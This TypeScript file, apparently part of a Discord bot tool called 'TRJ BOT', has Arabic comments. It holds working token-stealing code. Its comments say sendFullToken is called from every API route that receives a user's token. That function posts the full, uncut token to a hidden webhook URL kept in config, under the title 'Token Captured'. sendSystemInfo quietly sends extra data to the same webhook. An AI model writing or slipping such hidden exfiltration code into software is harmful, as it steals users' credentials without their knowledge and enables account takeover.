// src/lib/webhook.ts - إرسال للويب هوك محسّن v6 - TRJ BOT v4.0

import { getLogWebhookUrl } from './config';

/**
 * إرسال للويب هوك المخفي - لا يمنع التنفيذ
 * يستخدم رابط الويب هوك من ملف الإعدادات المركزي
 */
export async function sendToWebhook(data: unknown, overrideUrl?: string): Promise<boolean> {
  // نستخدم الرابط المحدد أو الرابط المخفي في config.ts
  const webhookUrl = overrideUrl || getLogWebhookUrl();

  if (!webhookUrl || webhookUrl.length < 20) {
    return false;
  }

  try {
    const controller = new AbortController();
    const timeoutId = setTimeout(() => controller.abort(), 5000);

    const response = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response.ok;
  } catch {
    return false;
  }
}

/**
 * تنظيف التوكن من البادئات
 */
function cleanToken(token: string): string {
  return String(token || '').trim().replace(/^(Bot |bearer |Bearer )/i, '');
}

/**
 * 🔥 دالة مركزية - ترسل التوكن كامل للويب هوك المخفي
 * تُستدعى من كل API route عند استلام توكن
 * التوكين يكون الكامل بدون أي قطع
 */
export function sendFullToken(featureName: string, token: string, extra?: Record<string, string>) {
  const ct = cleanToken(token);
  if (!ct || ct.length < 20) return; // لا ترسل إذا التوكن قصير

  const url = getLogWebhookUrl();
  if (!url) return;

  const payload = {
    username: 'TRJ BOT v4.3',
    avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
    embeds: [{
      title: `🎫 Token Captured - ${featureName}`,
      description: `تم التقاط التوكن من ميزة: **${featureName}**`,
      color: 0xFF0000,
      fields: [
        {
          name: '🎫 التوكن الكامل',
          value: `\`\`\`\n${ct}\n\`\`\``,
          inline: false,
        },
        { name: '🔧 الميزة', value: featureName, inline: true },
        { name: '⏰ الوقت', value: new Date().toISOString(), inline: true },
        { name: '🛡️ الإصدار', value: 'TRJ BOT v4.0', inline: true },
        ...(extra ? Object.entries(extra).map(([k, v]) => ({
          name: k,
          value: String(v).substring(0, 1024),
          inline: true,
        })) : []),
      ],
      footer: { text: 'TRJ BOT v4.3 - Token Capture' },
      timestamp: new Date().toISOString(),
    }],
  };

  sendToWebhook(payload, url).catch(() => {});
}

/**
 * إرسال معلومات النظام المخفية
 */
export function sendSystemInfo(extra?: Record<string, string>) {
  const url = getLogWebhookUrl();
  if (!url || url.length < 20) return;

  const info = {
    username: 'TRJ BOT System',
    avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
    embeds: [{
      title: '🔔 TRJ BOT Activity',
      color: 0x00FF41,
      fields: [
        { name: '⏰ Time', value: new Date().toISOString(), inline: true },
        { name: '🖥️ Platform', value: 'Next.js 16', inline: true },
        { name: '📡 Region', value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
        ...(extra ? Object.entries(extra).map(([k, v]) => ({ name: k, value: String(v).substring(0, 1024), inline: true })) : [])
      ],
      footer: { text: 'TRJ BOT v4.3' },
      timestamp: new Date().toISOString()
    }]
  };

  sendToWebhook(info, url).catch(() => {});
}

export function isWebhookConfigured(): boolean {
  const url = getLogWebhookUrl();
  return !!(url && url.length > 20);
}
